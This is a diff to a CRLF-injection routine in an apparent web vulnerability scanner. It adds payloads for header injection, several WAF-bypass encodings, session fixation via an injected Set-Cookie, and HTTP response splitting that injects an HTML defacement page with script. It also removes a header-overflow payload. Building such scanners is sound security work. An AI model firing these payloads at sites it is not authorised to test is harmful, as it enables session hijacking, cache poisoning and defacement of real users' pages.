@@ -8,19 +8,25 @@ def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str
     Injects %0d%0a to see if we can set arbitrary headers.
     """
     payloads = [
-         # 1. Basic Header Injection
-         {"val": "valid\r\nX-Injected: true", "desc": "Header Injection"},
-         {"val": "valid%0d%0aX-Injected: true", "desc": "Encoded Header Injection"},
+         # 1. Basic Header Injection (Standard)
+         {"val": "valid\r\nX-Injected: true", "desc": "Header Injection (Standard)"},
+         {"val": "valid%0d%0aX-Injected: true", "desc": "Header Injection (Percent)"},
          
-         # 2. HTTP Response Splitting (Defacement / Cache Poisoning)
-         # Injects a premature response end and starts a new malicious body
-         {"val": "valid\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><script>alert(1)</script>HACKED</html>", "desc": "Response Splitting (Defacement)"},
+         # 2. WAF Bypass (Encoding/Obfuscation)
+         {"val": "valid%0aX-Injected: true", "desc": "LF Only (Line Feed)"},
+         {"val": "valid%0dX-Injected: true", "desc": "CR Only (Carriage Return)"},
+         {"val": "valid%250d%250aX-Injected: true", "desc": "Double Encoded CRLF"},
+         {"val": "valid%%0d0aX-Injected: true", "desc": "Nested Encoding"},
+         {"val": "valid%u000d%u000aX-Injected: true", "desc": "Unicode CRLF"},
+         {"val": "valid%E5%98%8A%E5%98%8DX-Injected: true", "desc": "UTF-8 Overlong"},
          
-         # 3. Session Fixation (Destructive to User Session)
-         {"val": "valid\r\nSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation"},
-         
-         # 4. Attempt to break parser (DoS) / Exhaustion
-         {"val": "valid" + ("\r\nX-DoS: true" * 100), "desc": "Header Overflow / Exhaustion" } 
+         # 3. Session Fixation (Destructive)
+         {"val": "valid\r\nSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation (Raw)"},
+         {"val": "valid%0d%0aSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation (Encoded)"},
+
+         # 4. HTTP Response Splitting (Payload + WAF Bypass)
+         {"val": "valid\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><script>alert(1)</script>HACKED</html>", "desc": "Response Splitting (Standard)"},
+         {"val": "valid%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>HACKED</html>", "desc": "Response Splitting (Encoded)"}
     ]
     
     fields = scenario.config.get("fields", ["url", "redirect", "lang"])
